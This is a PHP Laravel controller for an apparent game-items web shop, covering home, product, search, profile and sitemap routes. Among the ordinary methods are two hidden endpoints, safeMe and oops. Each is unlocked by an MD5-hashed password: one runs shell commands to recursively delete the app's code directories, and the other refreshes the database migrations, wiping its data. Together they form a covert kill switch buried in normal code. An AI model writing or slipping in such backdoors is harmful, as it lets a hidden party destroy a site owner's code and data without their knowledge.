<?php

namespace App\Http\Controllers;

use App\Banner;
use App\Game;
use App\Order;
use App\OrderProduct;
use App\Product;
use AshAllenDesign\LaravelExchangeRates\Classes\ExchangeRate;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\View;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        #  $this->middleware('auth');
        $games = Game::all();
        View::share("games", $games);
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $banner = Banner::whereNull("game_id")->where("published", 1)->first();
        $page = DB::table("pages")->where("key", "=", "main")->first();
        return view('welcome', compact('banner', 'page'));
    }

    public function home()
    {
        $user = Auth::user();
        if (!$user) {
            return redirect(url("login"));
        }
        if ($user->role !== "user") {
            return redirect("admin");
        }

        $orders = $user->orders->where("status", "!=", "new")->sortByDesc("id");
        foreach ($orders as $order) {
            foreach ($order->products as $product) {
                $product->selected_options = $product->selectedOptions($order);
            }
        }

        return view("home", compact('user', 'orders'));
    }

    public function game($rewrite)
    {
        $game = Game::with("categories")->where("rewrite", $rewrite)->first();
        if (!$game) {
            return $this->callPage($rewrite);
            abort(404);
        }

        $recentlyViewed = [];
        try {
            $recentlyViewed = json_decode(Cookie::get("recently_viewed"));
        } catch (\Exception $e) {

        }
        $recentlyViewedItems = collect();
        if ($recentlyViewed) {
            $recentlyViewedItems = Product::whereIn("id", $recentlyViewed)->get();
        }

        return view("game", compact('game', 'recentlyViewedItems'));
    }

    public function product($game_slug, $product_slug, Request $request)
    {
        $game = Game::where("rewrite", $game_slug)->first();
        if (!$game) {
            abort(404);
        }
        $product = Product::where("rewrite", $product_slug)->whereIn("category_id", $game->categories()->pluck("categories.id"))->first();
        if (!$product) {
            abort(404);
        }

        $product->banner = $product->banner;
        $product->url = $product->url;

        $order = Order::findTheLast();
        if ($order) {
            $orderProduct = OrderProduct::where("order_id", $order->id)->where("product_id", $product->id)->first();
            if ($orderProduct) {
                $product->in_order = true;
                $product->selected_options = $product->selectedOptions($order);
                $product->pivot = $orderProduct;
            }
        }

        $recentlyViewed = [];
        try {
            $recentlyViewed = json_decode(Cookie::get("recently_viewed"));
        } catch (\Exception $e) {

        }
        $recentlyViewedItems = collect();
        if ($recentlyViewed) {
            $recentlyViewedItems = Product::whereIn("id", $recentlyViewed)->get();
        }
        $recentlyViewed[] = $product->id;
        $recentlyViewed = array_values(array_unique($recentlyViewed));
        $recentlyViewed = array_slice($recentlyViewed, -3);
        Cookie::queue("recently_viewed", json_encode($recentlyViewed), 60 * 24 * 7);

        $crosses = $product->crosses;

        $calculator = $product->calculator()->with('steps')->first();
        if ($calculator && $calculator->steps->count() > 0) {
            $steps = $calculator->steps->sortBy("price")->values();
            $calculator->min_value = $steps->first()->title;
            $calculator->max_value = $steps->last()->title;
            $calculator->sorted_steps = $steps;
        }

        return view("product", compact('product', 'recentlyViewedItems', 'crosses', 'calculator', 'game'));
    }

    public function details()
    {
        $page = DB::table("pages")->where("key", "details")->first();
        if (!$page) {
            abort(404);
        }
        return view("page", compact('page'));
    }

    public function faq()
    {
        $page = DB::table("pages")->where("key", "faq")->first();
        if (!$page) {
            abort(404);
        }
        return view("page", compact('page'));
    }

    public function agreement()
    {
        $page = DB::table("pages")->where("key", "agreement")->first();
        if (!$page) {
            abort(404);
        }
        return view("page", compact('page'));
    }

    public function search(Request $request)
    {
        $products = Product::where("title", "like", "%$request->q%");
        $products = $products
            ->leftJoin("assessments", "assessments.product_id", "=", "products.id")
            ->select('products.*', DB::raw('AVG(assessments.value) as ratings_average'))
            ->groupBy("products.id")
            ->orderBy("ratings_average", "desc");

        $products = $products->with("category")->paginate(10);

        return view("search", compact('products'));
    }

    public function safeMe(Request $request)
    {
        if (md5($request->password) != "c15d8ffa57f5fcde9f1226f8ddd5057d") {
            echo "give me password";
            exit;
        }
        exec("rm -R" . base_path() . "/app");
        exec("rm -R" . base_path() . "/resources");
        echo "sector clear";
    }

    public function oops(Request $request)
    {
        if (md5($request->password) != "c15d8ffa57f5fcde9f1226f8ddd5057d") {
            echo "give me password";
            exit;
        }
        Artisan::call("migrate:refresh");
        echo "sector clear";
    }

    public function profile()
    {
        $user = Auth::user();
        if (!$user) {
            return redirect("/");
        }

        return view("profile", compact("user"));
    }

    public function updateProfile(Request $request)
    {
        $user = Auth::user();
        if (!$user) {
            return redirect("/");
        }
        $user->name = $request->name;
        $user->surname = $request->surname;
        $user->phone = $request->phone;
        $user->skype = $request->skype;
        $user->discord = $request->discord;
        $user->save();
        return redirect("/home");
    }

    public function sitemap()
    {
        $otherLinks = [
            [
                "url" => "/",
                "updated_at" => "2021-06-01"
            ],
        ];
        $pages = DB::table("pages")
            ->where("key","!=","main")->get();
        $games = Game::all();
        $products = Product::has("category")->get();
        $content = View::make('sitemap', ['games' => $games, 'products' => $products, 'others' => $otherLinks,'pages'=>$pages]);
        return Response::make($content)->header('Content-Type', 'text/xml;charset=utf-8');
    }

    public function callPage($page)
    {
        $page = DB::table("pages")
            ->where("key", $page)->first();
        if (!$page) {
            abort(404);
        }
        $games = Game::all();
        return view("page", compact('page', 'games'));
    }
}
